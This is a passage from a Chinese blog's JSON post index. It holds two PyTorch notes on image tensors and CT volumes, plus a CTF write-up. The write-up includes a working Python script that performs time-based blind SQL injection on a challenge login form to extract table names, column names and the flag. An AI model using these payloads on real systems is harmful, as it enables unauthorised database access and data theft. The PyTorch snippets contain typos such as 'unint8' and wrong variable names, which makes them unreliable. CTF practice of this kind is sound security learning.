torch.zeros(batch_size,3,256,dtype=torch.unint8)\n\n这表明我们的批处理将三幅高度256，宽度256的rgb图像组成，现在可以从一个输入目录中加载所有的png图像，并将它们存储在张量中\nimport osdata_dir = '文件目录'filenames = [name for name in os.listdir(data_dir)]for i, filename in enumerate(filename):\timg_arr = imageio.imread(os.path.join(data_dir,filename))\timg_t = torch.from_numpy(img_arr)\timg_t = img_t.permute(2,0,1)\timg_t = img_t[:3]//这里只保留三个通道，即处理单个图片的三个通道\tbatch[i] = img_t\n\n正规化数据神经网络通常使用浮点数张量作为输入，当输入的数据的范围是0-1或-1~1的时候，神经网络表现出最佳的寻来你性能\n需要做的就是将张量转换为浮点数并对像素的值进行归一化处理，将张量强制转化为浮点数并归一化，正规化的一种方式是将像素值除以255\nbatch = batch.float() batch /= 255.0 \n\n正规化的另一种方法是计算输入数据的均值和标准查，并对其进行缩放，使每一个通道的均值为0，标准差为1：\nn_channels = batch.shape[1] for c in range(n_channels):     \tmean = torch.mean(batch[:, c])     \tstd = torch.std(batch[:, c])     \tbatch[:, c] = (batch[:, c] - mean) / std\n\n还可以对输入进行其他的操作，如旋转和缩放啊还有裁剪，这样可能有助于训练，也有可能使任意输入复合网络的输入要求\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"记一次基于盲注的脚本编写","url":"/2025/04/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9F%BA%E4%BA%8E%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/","content":"sql盲注脚本本题是一个盲注题，可以基于布尔或者是时间，采取穷举法，时间复杂度上天了，效率不高，但是好歹爆出来了\n\n直接在前端进行注入的话没有回显，抓个包看看\n\n可以看到有延长了，说明是单引号闭合，并且在name处存在sql盲注\n这个时候就可以直接写脚本进行爆破了，贴上脚本，并且进行一一解释\n#导入必要的库import requestsimport timel = 'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'#定义一个字符串，包含所有的数据，用于猜测数据url = \"http://2f326183-2993-42d8-8c8f-8635076e9a95.node5.buuoj.cn:81/login.php\"#目标urlsql1 = \"1' or if(substr((seLEct group_concat(table_name) from information_schema.tables  where table_schema=database()),%d,1)='%s',sleep(2),1)#\"#用来爆破库名的payload，使用两个占位符，后面在利用的时候会填入数据，下面的payload也是同理sql2 = \"1' or if(substr((seLEct group_concat(column_name) from information_schema.columns  where table_name='fl4g'),%d,1)='%s',sleep(2),1)#\"sql3 = \"1' or if(substr((seLEct group_concat(flag) from fl4g),%d,1)='%s',sleep(2),1)#\"flag = ''for num in range(1,100):#循环猜100次，按需增加猜解次数    for i in l:#开始逐个猜取各个位置上的字符        data = {            'name' : sql3 % (num,i),            'pass' : 'asdasd'        }#定义需要发送的数据以什么形式        t = int(time.time())#获取到发送payload时候的时间        r = requests.post(url = url , data = data , timeout = 5)#使用post方式传输数据        if int(time.time()) - t &gt; 2:#获取到接受响应的时候的时间，并且于发送payload的时间相减，获取响应时间，与两秒进行比较，如果大于两秒，说明猜取成功            flag += i#将猜取成功的数据拼接起来            print(\"flag:\",flag)            breakprint(\"flag:\",flag)#打印出所有的flag\n\n效果如下\n猜表名\n\n猜字段\n\n猜数据\n\n","categories":["web"],"tags":["web"]},{"title":"深度学习-7day","url":"/2025/04/21/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-7day/","content":"三维图像：体数据前文所提到如何加载和表示二维图像，在某些情况下，例如设计到ct的医学成像应用程序，我们通常需要处理从头到叫的大量图像序列，每一个序列代表人体的一个切片\n加载特定格式使用imageio模块中的volread函数加载一个ct扫描样本，该函数接受将目录作为参数，并将所有医学数字成像和通信文件汇编为一个numpy三维数组\n","categories":["深度学习"],"tags":["深度学习"]}]